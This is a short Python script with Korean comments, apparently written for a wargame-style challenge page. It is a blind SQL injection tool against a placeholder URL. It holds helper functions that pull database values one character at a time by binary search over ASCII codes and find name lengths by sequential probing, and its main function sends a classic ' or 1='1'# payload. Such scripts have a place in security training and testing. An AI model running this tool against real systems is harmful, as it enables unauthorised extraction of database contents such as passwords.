#!/usr/bin/env python 3.8
import requests

VICTIM = 'http://test.mydomain.com/prob.php'  #진단할 URL
PARAM = "pw"  # Blind SQL injection Payload를 포함할 파라미터
BLIND_CHECK_STR = 'Hello admin'  # Blind SQL Injection 참/거짓을 판단할 텍스트



# Blind SQL Injection payload가 담긴 http request 후 response를 받아오는 함수
def get_response(payload):
    params = {PARAM: payload}
    response = requests.get(VICTIM, params=params)
    # print(response.url)
    return response


# 응답값 내에 BLIND_CHECK_STR 값이 존재하는지 리턴하는 함수
def has_blind_check_str(response):
    if BLIND_CHECK_STR in response.text:
        return True
    else:
        return False


# 이진탐색법 이용해 Blind Sql injection 참/거짓 구분하는 함수
# ascii 코드로 알파벳 찾을 때 사용
def binary_search(query, value_length):
    result = ''

    for i in range(1, value_length + 1):
        start = 0
        end = 127
        while start <= end:
            payload = query
            mid = (start + end) // 2
            if has_blind_check_str(get_response(payload.format(i, '=', mid))):
                result += chr(mid)
                # print(result)
                break
            elif has_blind_check_str(get_response(payload.format(i, '<', mid))):
                end = mid - 1
            else:
                start = mid + 1
    return result


# 순차 탐색 알고리즘을 이용해 Blind Sql Injection 참/거짓 구분하는 함수
# DB 명, 테이블 명, 컬럼 명 길이 구할 때 사용
def sequential_search(query, number):
    for i in range(0, number + 1):
        payload = query.format(i)
        # print(query)
        if not has_blind_check_str(get_response(payload)):
            length = i
            if length == 0:
                raise ArithmeticError
            return length
    raise OverflowError


# 메인 함수
def main():
    try:
        #get_response("hi")
        get_response("' or 1='1'# ")
    except Exception:
        print("Payload 요청 실패")

if __name__ == "__main__":
    main()
